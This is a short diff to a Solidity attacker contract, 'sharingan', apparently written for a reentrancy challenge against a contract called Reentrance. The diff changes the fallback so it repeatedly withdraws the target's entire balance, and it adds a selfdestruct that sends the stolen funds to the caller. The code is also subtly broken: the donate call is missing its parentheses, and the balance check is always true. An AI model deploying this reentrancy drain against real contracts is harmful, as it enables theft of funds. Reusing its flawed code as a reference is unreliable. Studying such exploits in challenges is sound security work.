@@ -31,23 +31,27 @@ contract Reentrance {
 
 contract sharingan {
     Reentrance con;
-
+    
     constructor (address payable _target) public {
         con = Reentrance(_target);
     }
-
+    
     function mix() public payable {
         con.donate{value: 1 ether};
         con.withdraw(1 ether);
     }
-
+    
     fallback() external payable {
-        if (address(con).balance >= 1 ether) {
-         con.withdraw(1 ether);
+        if (address(con).balance >= 0 ether) {
+         con.withdraw(address(con).balance);   
         }
-
+        
     }
     function getBalance() public view returns (uint256) {
         return address(this).balance;
+    }
+    
+    function killContract() public {
+        selfdestruct(msg.sender);
     }
 }
